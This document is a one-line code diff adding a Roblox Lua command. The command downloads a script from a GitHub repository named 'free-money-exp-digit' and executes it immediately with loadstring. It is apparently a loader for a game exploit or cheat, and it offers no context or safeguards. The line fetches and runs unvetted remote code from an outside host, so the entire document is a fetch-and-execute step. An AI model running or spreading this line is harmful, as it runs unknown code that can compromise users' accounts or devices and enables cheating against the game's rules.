@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/luc1ano2923/free-money-exp-digit/refs/heads/main/13.lua'))();
